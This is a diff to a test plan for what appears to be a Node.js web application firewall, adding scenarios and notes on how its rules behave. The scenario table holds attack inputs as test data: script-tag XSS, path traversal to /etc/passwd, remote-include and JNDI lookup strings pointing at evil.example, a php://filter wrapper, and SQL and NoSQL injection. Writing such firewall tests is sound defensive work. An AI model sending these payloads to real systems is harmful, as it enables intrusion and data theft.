@@ -11,13 +11,18 @@ Shared baseline config: `{ presets: ['default'], level: 'balanced' }`.
 | 3 | XSS in query | `GET /search?q=<script>alert(1)</script>` | `403` |
 | 4 | Path traversal | `GET /search?q=../../etc/passwd` | `403` |
 | 5 | RFI / remote URL | `GET /search?q=http://evil.example/shell.txt` | `403` |
+| 5b | RFI / stream wrapper | `GET /search?q=php://filter/convert.base64-encode/resource=index` | `403` |
 | 6 | Scanner UA | `GET /` with `User-Agent: sqlmap/1.7` | `403` |
+| 6b | JNDI in header | `GET /` with `User-Agent: ${jndi:ldap://evil.example/a}` | `403` |
+| 6c | NoSQL operator in body | `POST /echo` JSON `{ "user": { "$ne": null } }` | `403` |
 | 7 | Health path | `GET /health` | `200` (default preset does **not** whitelist `/health`; clean traffic is allowed) |
 | 8 | POST body SQLi | `POST /echo` JSON `{ "msg": "1 OR 1=1" }` | `403` |
 | 8b | POST body XSS | `POST /echo` JSON `{ "msg": "<script>x</script>" }` | `403` |
 | 9 | Rate-limit | Many requests from same IP | Optional / flaky — default rule is `120` req / `60s` (`preset-dos-rate-limit`). Not asserted in CI-style runner; see notes below. |
 | 10 | `disabledRuleIds` smoke | Ephemeral Express + Nest (`nestMiddleware`) with SQLi query rules disabled | SQLi query → `200` |
 | 10b | Custom rule smoke | Ephemeral Express + Nest with rule blocking path `/blocked` | `GET /blocked` → `403` |
+| 11 | Nested query parser | Ephemeral Express with `query parser: 'extended'`, `GET /search?user[$ne]=null` | `403` |
+| 11b | Nested query, clean | Same server, `GET /search?filter[status]=open` | `200` |
 
 ## How to run
 
@@ -49,10 +54,11 @@ Environment overrides:
 
 1. **`/health` is not special** under `presets: ['default']`. A whitelist would need a custom `allow` rule or omitting the path from middleware.
 2. **Rate-limit** shares an in-process counter per engine instance. Hitting four servers does not share counters. Triggering 120+ requests is slow and can interfere with other scenarios if run mid-suite — keep it optional.
-3. **RFI on path** does not match bare `http://` (query does). Prefer query payloads for scenario 5.
-4. **SQLi classic** matches patterns like `OR 1=1` / `UNION SELECT`; advanced time-based patterns need `level: 'high'` or above.
-5. Nest `MiniWafModule` is a plain class (no `@Module()` decorator) so `@nestjs/common` stays an optional peer. `forRoot` binds options onto `MiniWafMiddleware` because Nest instantiates middleware via `new` without `@Inject`.
-6. **Koa** has no built-in Mini-WAF package entry; the integration app is the reference for the README custom-adapter path.
+3. **`preset-rfi-remote-url` is narrow on purpose.** A bare `https://host/path` value is *not* blocked (that would break OAuth `redirect_uri` and CDN links); the rule needs an executable/text extension (`.php`, `.txt`, `.jsp`, …) or a trailing `?`. Scenario 5 uses `shell.txt` for that reason.
+4. **SQLi classic** matches patterns like `OR 1=1` / `UNION SELECT`; advanced time-based patterns need `level: 'high'` or above. Scenario 10 has to disable `preset-sqli-tautology` as well, since `1' OR 1=1` matches the quoted-tautology rule too.
+5. **Query parameter names are not scanned.** Scenario 11 sets `query parser: 'extended'` so `?user[$ne]=null` arrives as a nested object; with Express 5's default `simple` parser the payload stays in the key and is invisible to the engine. Scenario 6c therefore uses the JSON body form, which works on every adapter.
+6. Nest `MiniWafModule` is a plain class (no `@Module()` decorator) so `@nestjs/common` stays an optional peer. `forRoot` binds options onto `MiniWafMiddleware` because Nest instantiates middleware via `new` without `@Inject`.
+7. **Koa** has no built-in Mini-WAF package entry; the integration app is the reference for the README custom-adapter path.
 
 ## Bugs found while building this harness
 
